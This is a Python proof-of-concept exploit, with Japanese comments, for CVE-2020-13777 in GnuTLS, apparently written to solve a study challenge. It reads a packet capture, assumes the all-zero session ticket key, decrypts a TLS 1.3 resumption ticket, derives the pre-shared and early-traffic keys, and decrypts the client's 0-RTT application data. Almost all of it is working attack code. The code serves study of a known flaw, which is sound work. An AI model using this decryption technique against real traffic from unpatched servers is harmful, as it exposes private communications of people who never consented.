#Require Python 3.6.x later
#Validation version: Python 3.7.7
#pip3 install scapy cryptography pycryptodome
'''
実行するには次のいづれかのディレクトリ構成の状態にしてください。
$tree
.
├── challenge_CVE-2020-13777
│   ├── README.md
│   └── gnutls_vul_challange.pcap
└── main.py
または、
$tree
.
├── gnutls_vul_challange.pcap
└── main.py


実行するにはPython3.5.x以降で次のように実行します。
$python3 --version
Python 3.7.7

$python3 main.py # 1行目は復号した結果のASCII, 2行目はhex
b"Let's study TLS with Professional SSL/TLS!\n\n\x17"
4c6574277320737475647920544c5320776974682050726f66657373696f6e616c2053534c2f544c53210a0a17
'''

'''
## 攻撃者の目的
セッション再開時のCHLOパケットに含まれるアプリケーションデータの平文を取得する

## 前提・攻撃者の能力
攻撃者はTLS1.3の最初のハンドシェイクのCHLOのパケットとセッション再開時のCHLOのパケット**のみ**を持っている。
このCHLOがCVE-2020-13777をもつサーバーとやりとりしていることを知っている。
CVE-2020-13777をもつサーバー(gnutls)の実装や関連するRFCは既知であり、攻撃者は必要に応じてそれらを参照することができる。

このPoCの範囲外
- CipherSuiteの推定
  - 簡単のため、攻撃者は1回目のCHLOのCipher Suitesのリストを見て先頭にあるTLS_AES_256_GCM_SHA384をサーバーが選択したと推定した仮定でハードコーディングしている

'''

import struct

import hashlib, hmac as hmac_hashlib
from scapy.all import *

from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import hashes

from hkdf import hkdf_label, hkdf_expand_label, KeySchedule

GNUTLS_MAC_SHA384=7
#Reference: https://gitlab.com/gnutls/gnutls/-/blob/e48290a51da19288986bd7aaca265ea62b054dc8/devel/libdane-latest-x86_64.abi
#復号したSession Ticketに含まれるprf_id==7に対応するプリミティブはMAC_SHA384

load_layer('tls')


'''
# PoC code

MIT License

Copyright (c) 2020 prprhyt

Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the "Software"), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.

'''
#encrypted session ticket
def EncST():
    def __init__(self):
        self.identity_len:int
        self.key_name:bytes
        self.iv:bytes
        self.data_length:int
        self.data:bytes
        self.mac:bytes
        self.obfuscated_ticket_age:int

def SessionTicketData():
    def __init__(self):
        self.perf_id:int
        self.add_age:int
        self.lifetime:int
        self.resumption_master_secret_size:int
        self.resumption_master_secret:bytes
        self.nonce_size:int
        self.nonce:int
        self.state_size:int
        self.state:bytes
        self.create_time_tv_sec_upper:int
        self.create_time_tv_sec_lower:int
        self.create_time_tv_sec_nsec:int

def Alice_send():
    try:
        packets = rdpcap('challenge_CVE-2020-13777/gnutls_vul_challange.pcap')
    except FileNotFoundError as e:
        packets = rdpcap('./gnutls_vul_challange.pcap')
    
    first_chlo = packets[3] # pick first CHLO Packet
    resumption_chlo = packets[29] # pick resumption CHLO Packet
    return first_chlo, resumption_chlo

def Eve_receive(resumption_chlo):
    # eve guess session ticket encryption key(STEK) from CVE-2020-13777
    key = b"\x00"*32
    hmac_key = b"\x00"*16


    # Parse encrypted Session Ticket Data from resumption CHLO
    enc_st = EncST

    chlo_tls_layer = TLS(resumption_chlo.load)
    psk_identity = chlo_tls_layer.fields['msg'][0].ext[-1].identities[0]
    
    enc_st.identity_len = psk_identity.identity_len
    enc_st.key_name = psk_identity.identity.key_name
    enc_st.iv = psk_identity.identity.iv
    enc_st.data_length = psk_identity.identity.encstatelen
    enc_st.data = psk_identity.identity.encstate
    enc_st.mac = psk_identity.identity.mac
    enc_st.obfuscated_ticket_age = psk_identity.obfuscated_ticket_age
    
    # Decrypt Session Ticket Data
    # Reference: https://gitlab.com/gnutls/gnutls/-/blob/1d4615aa650dad1c01452d46396c0307304b0245/lib/ext/session_ticket.c#L181
    cipher = AES.new(key, AES.MODE_CBC, enc_st.iv)
    if 0.0 == enc_st.data_length % AES.block_size:
        raw_session_ticket = cipher.decrypt(enc_st.data)
    else:
        raw_session_ticket = unpad(cipher.decrypt(enc_st.data), AES.block_size)
    
    # Calc hmac
    # Reference: https://gitlab.com/gnutls/gnutls/-/blob/1d4615aa650dad1c01452d46396c0307304b0245/lib/ext/session_ticket.c#L155
    digester = hmac_hashlib.new(hmac_key, digestmod=hashlib.sha1)
    digester.update(enc_st.key_name)
    digester.update(enc_st.iv)
    digester.update(enc_st.data_length.to_bytes(2, byteorder='big'))
    digester.update(enc_st.data)
    calc_mac = digester.digest()

    # Compare hmac
    if not enc_st.mac==calc_mac:
        print("Mismatch hmac! Decryption is failed.")
        exit(1)
    
    # Parse Raw Session Ticket Data
    st = SessionTicketData

    seek=0
    st.perf_id = int.from_bytes(raw_session_ticket[seek:seek+2], 'big')
    seek+=2
    st.add_age = int.from_bytes(raw_session_ticket[seek:seek+4], 'big')
    seek+=4
    st.lifetime = int.from_bytes(raw_session_ticket[seek:seek+4], 'big')
    seek+=4
    st.resumption_master_secret_size = int.from_bytes(raw_session_ticket[seek:seek+1], 'big')
    seek+=1
    st.resumption_master_secret = raw_session_ticket[seek:seek+st.resumption_master_secret_size]
    seek+=st.resumption_master_secret_size
    st.nonce_size = int.from_bytes(raw_session_ticket[seek:seek+1], 'big')
    seek+=1
    st.nonce = raw_session_ticket[seek:seek+st.nonce_size]
    seek+=st.nonce_size
    st.state_size = int.from_bytes(raw_session_ticket[seek:seek+2], 'big')
    seek+=2
    st.state = raw_session_ticket[seek:seek+st.state_size]
    seek+=st.state_size
    st.create_time_tv_sec_upper = int.from_bytes(raw_session_ticket[seek:seek+4], 'big')
    seek+=4
    st.create_time_tv_sec_lower = int.from_bytes(raw_session_ticket[seek:seek+4], 'big')
    seek+=4
    st.create_time_tv_sec_nsec = int.from_bytes(raw_session_ticket[seek:seek+4], 'big')
    seek+=4
    
    # チケットが4バイト分多いのが気になる。0x00,0x00,0x00,0x00だったのでパディングかな
    #print(len(raw_session_ticket))
    #print(seek)

    # Derive PSK from st.resumption_master_secret and st.nonce
    # Reference: RFC8446 Section 4.6.1 https://tools.ietf.org/html/rfc8446#page-75
    if not GNUTLS_MAC_SHA384==st.perf_id:
        print("Unfortunately, this PoC does not support prf_id=%d." % st.perf_id)
        exit(1)
    hash_algorithm = hashes.SHA384()
    psk = hkdf_expand_label(hash_algorithm, st.resumption_master_secret, b"resumption", st.nonce, hash_algorithm.digest_size)

    # Derive Early Secret from PSK
    # Reference: RFC8446 Section 7.1 https://tools.ietf.org/html/rfc8446#page-91
    key_schedule_psk = KeySchedule(hash_algorithm)
    key_schedule_psk.extract(psk)

    # Derive Binder key
    binder_key = key_schedule_psk.derive_secret(b"res binder")
    binder_length = key_schedule_psk.algorithm.digest_size

    # Get Client Hello contents data
    # 5==len(Content Type (1octet) || Version (2octet))
    # chlo_tls_layer.lenで先頭のRecord layerの長さが取れる(=HandShake Protocol: Client Helloのみ)
    client_hello_data = chlo_tls_layer.raw_packet_cache[5:5+chlo_tls_layer.len]
    
    # Validate PSK with PSK binder
    # Reference: RFC8446 4.2.11 https://tools.ietf.org/html/rfc8446#page-57
    # CHLO Handshake contents:
    # | CHLO contents without PSK Binders || PSK Binders len (2octet) || PSK Binders (PSK Binders len) |
    binders_len = chlo_tls_layer.fields['msg'][0].ext[-1].binders_len
    chlo_raw_without_binders = client_hello_data[:-(binders_len+2)]
    key_schedule_psk.update_hash(chlo_raw_without_binders)
    expect_binder = key_schedule_psk.finished_verify_data(binder_key)

    ## Read binder from CHLO
    binder:bytes=chlo_tls_layer.fields['msg'][0].ext[-1].binders[0].binder

    ## Compare binder
    if not binder==expect_binder:
        print("Mismatch binder! psk is not valid.")
        exit(1)


    # Decrypt early data(0-RTT Application Data)

    ## Derive client_early_traffic_secret from Early Secret
    key_schedule_psk.update_hash(client_hello_data[-(binder_length+3):])
    client_early_traffic_secret = key_schedule_psk.derive_secret(b"c e traffic")
    
    ## Derive key and iv for early data from client_early_traffic_secret
    ## Reference: RFC8446 7.3 https://tools.ietf.org/html/rfc8446#page-95
    key_length = 32
    iv_length = 12
    early_data_key = hkdf_expand_label(hash_algorithm, client_early_traffic_secret, b"key", b"", key_length)
    early_data_iv = hkdf_expand_label(hash_algorithm, client_early_traffic_secret, b"iv", b"", iv_length)

    ## Derive nonce from iv and packet number
    ## Reference: RFC8446 5.3 https://tools.ietf.org/html/rfc8446#page-82
    packet_number = 0
    early_data_nonce = (packet_number ^ int.from_bytes(early_data_iv, 'big')).to_bytes(len(early_data_iv), 'big')

    ## Get encrypted early data
    encrypted_early_application_data = chlo_tls_layer.lastlayer().fields['msg'][0].data
    ciphertext = encrypted_early_application_data

    ## Derive associate
    ### AEADのassociate=(Early dataが入っているTLSレコードレイヤーのヘッダ+暗号文の長さ):
    ### Opaque Type (1octet) || Version (2octet) || len(Encrypted Application Data) (2octet)
    opaque_type = chlo_tls_layer.lastlayer().fields['type']
    tls_version = chlo_tls_layer.lastlayer().fields['version']
    associate = opaque_type.to_bytes(1, 'big') + tls_version.to_bytes(2, 'big') + len(ciphertext).to_bytes(2, "big")

    ## Decrypt early data
    mac_len = 16
    cipher_dec_early_data = AES.new(key=early_data_key, mode=AES.MODE_GCM, nonce=early_data_nonce, mac_len=mac_len)
    cipher_dec_early_data.update(associate)
    plaintext = cipher_dec_early_data.decrypt_and_verify(ciphertext[:-mac_len], ciphertext[-mac_len:])

    print(plaintext)       # b"Let's study TLS with Professional SSL/TLS!\n\n\x17"
    print(plaintext.hex()) # 4c6574277320737475647920544c5320776974682050726f66657373696f6e616c2053534c2f544c53210a0a17

def main():
    _, resumption_chlo = Alice_send()
    Eve_receive(resumption_chlo)

if __name__ == "__main__":
    main()